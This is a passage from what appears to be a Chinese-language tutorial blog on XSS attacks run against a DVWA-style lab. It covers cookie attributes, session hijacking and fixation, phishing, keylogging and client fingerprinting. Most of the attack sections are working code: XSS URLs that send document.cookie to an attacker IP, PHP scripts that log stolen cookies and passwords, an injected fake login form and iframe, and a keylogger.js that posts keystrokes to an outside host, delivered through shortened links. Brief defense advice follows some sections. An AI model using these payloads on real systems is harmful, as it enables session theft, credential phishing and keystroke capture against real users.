<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">&quot;user_id=123&quot;</span>;	<span class="comment">//创建一个Cookie变量user_id=123</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;user_id=0; expires=Thu, 01 Jan 1970 00:00:00 GMT&quot;</span>;	<span class="comment">//删除Cookie变量（Cookie的Expire的值为过去时间）</span></span><br></pre></td></tr></table></figure>
<h4 id="Cookie的属性"><a href="#Cookie的属性" class="headerlink" title="Cookie的属性"></a>Cookie的属性</h4><h5 id="Name-Value"><a href="#Name-Value" class="headerlink" title="Name / Value"></a>Name / Value</h5><p>存储是以 <code>Name=Value</code> 的形式。</p>
<h5 id="Domain-Path-作用域"><a href="#Domain-Path-作用域" class="headerlink" title="Domain / Path 作用域"></a>Domain / Path 作用域</h5><p><code>Domain</code> 是限制域名，设置为 <code>www.lilnong.top</code> 的话，<code>cors.lilnong.top</code> 就获取不到了。<br><code>Path</code> 是限制路径，如果设置为 <code>/cors</code> 的话，<code>/api</code> 下的请求就不会携带该 <code>cookie</code>。</p>
<h5 id="Expires-Max-Age-有效性"><a href="#Expires-Max-Age-有效性" class="headerlink" title="Expires / Max-Age 有效性"></a>Expires / Max-Age 有效性</h5><p><code>Expires</code> 是当前 <code>Cookie</code> 的过期时间，默认是会话级别。</p>
<p><code>Max-Age</code> 是当前 <code>Cookie</code> 经过多少秒失效。</p>
<ol>
<li>大于 0 是计算经过多少秒失效</li>
<li>等于 0 是会话级别，关闭浏览器就失效</li>
<li>小于 0 是指 cookie 无效，立即删除</li>
</ol>
<p><code>Max-Age</code> 的优先级比 <code>Expires</code> 更高。</p>
<h5 id="HttpOnly-安全性"><a href="#HttpOnly-安全性" class="headerlink" title="HttpOnly 安全性"></a>HttpOnly 安全性</h5><p>设置以后客户端脚本就无法通过 <code>document.cookie</code> 等方式获取。<br>有助于避免 XSS 攻击。</p>
<h5 id="Secure-安全性"><a href="#Secure-安全性" class="headerlink" title="Secure 安全性"></a>Secure 安全性</h5><p>设置以后客户端只有 <code>HTTPS</code> 协议下才会发送给服务端。<br>使用 <code>HTTPS</code> 安全协议，可以<strong>保护 Cookie 在浏览器和 Web 服务器间的传输过程中不被窃取和篡改</strong>。</p>
<h5 id="SameSite-安全性"><a href="#SameSite-安全性" class="headerlink" title="SameSite 安全性"></a>SameSite 安全性</h5><p>可以设置 <code>Cookie</code> 在什么场景下会被发送。从而屏蔽跨站时发送 cookie，用于阻止<strong>跨站请求伪造攻击（CSRF）</strong>。</p>
<p><code>SameSite</code> 可以设置下面三个值：</p>
<ol>
<li><p><strong>Strict</strong> 只允许<strong>同站</strong>请求携带 Cookie。比如 <code>lilnong.top</code> 跳转到 <code>www.lilnong.top/cors/</code>，就属于同站。</p>
</li>
<li><p><strong>Lax</strong>（<strong>chrome 80 后</strong>的默认值） <strong>允许部分第三方请求场景</strong> 携带Cookie。</p>
</li>
<li><p><strong>None</strong>（<strong>chrome 80 前</strong>的默认值） 无论是否跨站都会发送 Cookie。<strong>必须同时加上 Secure 属性，否则无效，</strong>也就是说只支持 HTTPS。</p>
<blockquote>
<p>IOS 12 的 Safari 以及老版本的一些 Chrome 会把 SameSite=none 识别成 SameSite=Strict，所以服务端必须在下发 Set-Cookie 响应头时进行 User-Agent 检测，对这些浏览器不下发 SameSite=none 属性</p>
</blockquote>
</li>
</ol>
<h3 id="Session会话劫持攻击"><a href="#Session会话劫持攻击" class="headerlink" title="Session会话劫持攻击"></a>Session会话劫持攻击</h3><p>会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><h5 id="Session管理"><a href="#Session管理" class="headerlink" title="Session管理"></a>Session管理</h5><p>http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是 Base  Auth ，但是这种方式，用户名和密码在每次请求中都会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。所以现在大多数站点采用基于cookie的session管理方式：用户登陆成功后，设置一个唯一的cookie标识本次会话，基于这个标识进行用户授权。只要请求中带有这个标识，都认为是登录态。</p>
<h5 id="Cookie窃取与Session劫持"><a href="#Cookie窃取与Session劫持" class="headerlink" title="Cookie窃取与Session劫持"></a>Cookie窃取与Session劫持</h5><p>攻击者获取Session会话的方式有以下三种：</p>
<ol>
<li>暴力破解：尝试各种Session ID，直到破解为止；</li>
<li>预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来；</li>
<li>窃取：使用网络嗅探，XSS攻击等方法获得。</li>
</ol>
<p>其中最常用的方式就是采用使用XSS攻击方法窃取Cookie信息。</p>
<p>既然cookie用于维持会话，如果这个cookie被攻击者窃取会发生什么？session被劫持！ 攻击者劫持会话就等于合法登录了你的账户，可以浏览大部分用户资源。</p>
<h4 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><ul>
<li>目标用户需要先登录站点；</li>
<li>登录成功后，该用户会得到站点提供的一个会话标识SessionID；</li>
<li>攻击者通过某种攻击手段捕获Session ID；</li>
<li>攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话。</li>
</ul>
<p><img src="https://i.loli.net/2021/11/12/WdjsT3qU42il9ZM.jpg" alt="img"></p>
<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>在攻击者的远程服务器上，有一个接收和记录cookie信息的文件，代码如下： </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>, <span class="variable">$cookie</span> .<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>探测是否存在XSS注入点</p>
<p><img src="https://i.loli.net/2021/11/11/LNEFQ4vgSI6japP.png" alt="image-20211111221544933"></p>
<p>构造我们的攻击代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/xss_r/?name=&lt;script&gt;x=new Image();x.src=&quot;http://192.168.123.42/attack/get_cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">URL编码后：</span><br><span class="line">http://hackrock.com:812/vulnerabilities/xss_r/?name=%3Cscript%3Ex%3Dnew%20Image()%3Bx.src%3D%22http%3A%2F%2F192.168.123.42%2Fattack%2Fget_cookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用短网址生成工具缩短URL</p>
<blockquote>
<p>短网址生成：<a href="https://www.985.so/">https://www.985.so/</a></p>
</blockquote>
<p><img src="https://i.loli.net/2021/11/11/ygj21LRzBhIXksF.png" alt="image-20211111223328469"></p>
<p>将生成的短网址发送给管理员点击</p>
<p>在攻击机上能够看到成功拿到了管理员的cookie数据，并且从中记录了管理员的登录状态（SessionID）</p>
<p><img src="https://i.loli.net/2021/11/11/d7nuFj569NpDSCq.png" alt="image-20211111223646595"></p>
<p>在浏览器上更改我们的Cookie值（重放攻击），便可以直接以管理员身份登录</p>
<p><img src="https://i.loli.net/2021/11/11/ghCl76JPt8auRfB.png" alt="image-20211111224048160"></p>
<h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h4><ol>
<li><p>更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。</p>
</li>
<li><p>关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。</p>
</li>
<li><p>设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。</p>
</li>
<li><p>关闭所有phpinfo类dump request信息的页面。</p>
</li>
<li><p>验证HTTP头部信息</p>
<p>在http访问头文件：[Accept-Charset、Accept-Encoding、Accept-Language、User-Agent]，浏览器一般发出的头部不会改</p>
</li>
</ol>
<h3 id="Session会话固定攻击"><a href="#Session会话固定攻击" class="headerlink" title="Session会话固定攻击"></a>Session会话固定攻击</h3><p>会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。</p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如<code>document.cookie=&quot;sessionid=123&quot;</code>，这种方式可以采用跨站脚本攻击来达到目的。</p>
<h4 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><ul>
<li>攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；</li>
<li>目标用户携带攻击者设定的Session ID登录站点；</li>
<li>攻击者通过Session ID获得合法会话。</li>
</ul>
<p><img src="https://i.loli.net/2021/11/12/jOPXoaYc52SZHDv.jpg" alt="img"></p>
<h4 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h4><p>探测是否存在XSS注入点</p>
<p><img src="https://i.loli.net/2021/11/11/LNEFQ4vgSI6japP.png" alt="image-20211111221544933"></p>
<p>构造我们的攻击代码，让管理员的Session固定为abc123</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/xss_r/?name=&lt;script&gt;document.cookie = &quot;PHPSESSID=abc123&quot;;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">URL编码后：</span><br><span class="line">http://hackrock.com:812/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.cookie%20=%20%22PHPSESSID=abc123%22;%3C/script%3E</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用短网址生成工具缩短URL</p>
<p>将生成的短网址发送给管理员点击，可以看到多出来一个PHPSESSID</p>
<p><img src="https://i.loli.net/2021/11/12/wYjSa9FdvDBfAIr.png" alt="image-20211112234740834"></p>
<p>在攻击机上，我们设置PHPSESSID的值为abc123，便可以成功登录管理员账号</p>
<p><img src="https://i.loli.net/2021/11/12/twQzLBKUrA2iYCN.png" alt="image-20211112234930824"></p>
<h4 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h4><ol>
<li>用户登录时生成新的SessionID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。</li>
<li>大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。</li>
</ol>
<h2 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h2><blockquote>
<p>网络钓鱼（Phishing）是一种利用网络进行的欺骗手段，主要通过对受害者心理弱点、好奇心、信任度等心理陷阱来实现诈骗，属于社会工程学的一种。</p>
</blockquote>
<h3 id="钓鱼页面的构造"><a href="#钓鱼页面的构造" class="headerlink" title="钓鱼页面的构造"></a>钓鱼页面的构造</h3><h4 id="钓鱼页面"><a href="#钓鱼页面" class="headerlink" title="钓鱼页面"></a>钓鱼页面</h4><p>这里我使用的是<code>httrack</code>进行网站克隆。当然也可以自己写一个。</p>
<p><img src="https://i.loli.net/2021/11/13/phFqQ5vxfyDLR2o.png" alt="image-20211113004524855"></p>
<p>克隆的网站不能说一模一样，只能说完全一致</p>
<p><img src="https://i.loli.net/2021/11/13/myAiJFVRKs8upzc.png" alt="image-20211113004819609"></p>
<p>更改克隆页面的源码，将表单提交的地址改为攻击者记录信息的脚本地址。</p>
<p><img src="https://i.loli.net/2021/11/13/weXKgPSjaoU1AmR.png" alt="image-20211113005608788"></p>
<h4 id="记录信息的脚本"><a href="#记录信息的脚本" class="headerlink" title="记录信息的脚本"></a>记录信息的脚本</h4><p>在攻击者远程服务器（<a href="http://hackme.com）上，会存放一个接收记录账号和密码的程序文件（/attack/phishing.php），代码如下：">http://hackme.com）上，会存放一个接收记录账号和密码的程序文件（/attack/phishing.php），代码如下：</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$date</span> = fopen(<span class="string">&quot;logfile.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">	<span class="variable">$login</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	fwrite(<span class="variable">$date</span>, <span class="string">&quot;Username: <span class="subst">$login</span>\n&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$date</span>, <span class="string">&quot;Password: <span class="subst">$pass</span>\n&quot;</span>);</span><br><span class="line">	fclose(<span class="variable">$date</span>);</span><br><span class="line">	header(<span class="string">&quot;location: http://hackrock.com:812&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码来接收用户输入的账号（username）和密码（password）信息，并保存在logfile.txt文件中，然后用PHP的<code>header()</code>函数实现页面转向，让页面跳转到正常访问的页面。</p>
<p>当受害者访问钓鱼网站，并输入账号密码登录时，就会跳转到正常页面。此时攻击者远程服务器上便会记录受害者的账号和密码。</p>
<p><img src="https://i.loli.net/2021/11/13/YCkhHFde25EMfPt.png" alt="image-20211113010955442"></p>
<h3 id="XSS重定向钓鱼"><a href="#XSS重定向钓鱼" class="headerlink" title="XSS重定向钓鱼"></a>XSS重定向钓鱼</h3><p>这种钓鱼方式是把当前页面重定向到一个钓鱼网站上。假如hackrock.com为漏洞网站，那么钓鱼网站hackmee.com就会仿冒正常网站的网页内容及行为，从而进行钓鱼等诈骗活动。</p>
<p>假设hackrock.com上存在一处存储型XSS，那么我们构造Payload：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location.href=<span class="string">&quot;http://hackmee.com/login.html&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/13/XLeyzlo5AQT1gSv.png" alt="image-20211113120852156"></p>
<p>这样便会让受害者从当前访问的网页跳转到攻击者的钓鱼网站。</p>
<h3 id="XSS-HTML注入式钓鱼"><a href="#XSS-HTML注入式钓鱼" class="headerlink" title="XSS HTML注入式钓鱼"></a>XSS HTML注入式钓鱼</h3><p>HTML注入式钓鱼是指直接利用XSS漏洞注入HTML/JavaScript代码到页面中。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://hackrock.com:812/dvwa/css/login.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;position:absolute;top:0px;right:0px;border:0;height:100%;background-color:white&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://hackrock.com:812/dvwa/images/login_logo.png&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://hackmee.com/attack/phishing.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;user&quot;</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;loginInput&quot;</span> <span class="attr">size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;pass&quot;</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;loginInput&quot;</span> <span class="attr">AUTOCOMPLETE</span>=<span class="string">&quot;off&quot;</span> <span class="attr">size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Login&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;362c558491da59fbca0fc8904fea099b&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">&lt;/div &gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>让我们把代码进行压缩：</p>
<blockquote>
<p>代码压缩工具：<a href="http://tool.chinaz.com/js.aspx">http://tool.chinaz.com/js.aspx</a></p>
</blockquote>
<p>压缩后的代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span><span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span><span class="attr">href</span>=<span class="string">&quot;http://hackrock.com:812/dvwa/css/login.css&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;position:absolute;top:0px;right:0px;border:0;height:100%;background-color:white&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://hackrock.com:812/dvwa/images/login_logo.png&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://hackmee.com/attack/phishing.php&quot;</span><span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;user&quot;</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span><span class="attr">name</span>=<span class="string">&quot;username&quot;</span><span class="attr">class</span>=<span class="string">&quot;loginInput&quot;</span><span class="attr">size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;pass&quot;</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span><span class="attr">name</span>=<span class="string">&quot;password&quot;</span><span class="attr">class</span>=<span class="string">&quot;loginInput&quot;</span><span class="attr">AUTOCOMPLETE</span>=<span class="string">&quot;off&quot;</span><span class="attr">size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span><span class="attr">value</span>=<span class="string">&quot;Login&quot;</span><span class="attr">name</span>=<span class="string">&quot;Login&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span><span class="attr">name</span>=<span class="string">&quot;user_token&quot;</span><span class="attr">value</span>=<span class="string">&quot;362c558491da59fbca0fc8904fea099b&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/13/IuZSGyfHBwtoWc8.png" alt="image-20211113150807906"></p>
<p>这段代码会在正常页面中嵌入一个Form表单</p>
<p><img src="https://i.loli.net/2021/11/13/x4uDXAcilsFYzv2.png" alt="image-20211113151405078"></p>
<p>该例子中，相应的利用代码被附加到URL处，然后构造一个登录表单，该表单可以覆盖原页面显示，强迫用户输入账号和密码等信息。</p>
<h3 id="XSS跨框架钓鱼"><a href="#XSS跨框架钓鱼" class="headerlink" title="XSS跨框架钓鱼"></a>XSS跨框架钓鱼</h3><p>这种方式是通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼，此时主页面依然处在正常网站的域名下，因此具有很高的迷惑性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://hackmee.com/login.html&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position:absolute;top:0px;right:0px;overflow:hidden;&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/13/YXKisVqhgRHla9Q.png" alt="image-20211113152615533"></p>
<p>Iframe的效果可以做得很真实，可以跨框架覆盖整个页面。</p>
<h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><p>黑客可以在存在XSS漏洞的网页中植入键盘记录脚本，普通用户访问此网页时，该用户在当前页面上所有的键盘按键都会被记录下来，并且发送到远端服务器。</p>
<p>创建远程JS脚本文件：<code>keylogger.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">     evt = evt || <span class="built_in">window</span>.event</span><br><span class="line">     key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</span><br><span class="line">     <span class="keyword">if</span> (key) &#123;</span><br><span class="line">     <span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">     <span class="keyword">var</span> param = <span class="built_in">encodeURI</span>(key)</span><br><span class="line">     http.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://hackmee.com/attack/keylogger.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">     http.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">     http.send(<span class="string">&quot;key=&quot;</span>+param);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>创建用于接收键盘上的敲击记录的文件：<code>keylogger.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="variable">$log</span> = fopen(<span class="string">&quot;keylog.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="variable">$key</span>);</span><br><span class="line">    fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造好我们的恶意链接发送给受害者：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/xss_r/?name=%3Cscript%20src=%22http://hackmee.com/attack/keylogger.js%22%3E%3C/script%3E</span><br></pre></td></tr></table></figure>
<p>当受害者在输入框中输入值（无需提交），攻击者的远程服务器便会记录下相应的值。</p>
<p><img src="https://i.loli.net/2021/11/13/eF3EkPRuvVjwyDi.png" alt="image-20211113161126014"></p>
<h2 id="客户端信息刺探"><a href="#客户端信息刺探" class="headerlink" title="客户端信息刺探"></a>客户端信息刺探</h2><p>很多时候，攻击者为了获得更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道了用户使用的浏览器、操作系统，攻击者就可以有效实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。XSS能够帮助攻击者快速达到收集信息的目的。</p>
<p>如何通过JavaScript脚本识别浏览器版本呢？最直接的莫过于通过XSS读取浏览器的UserAgent对象：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert(navigator.userAgent);</span><br></pre></td></tr></table></figure>
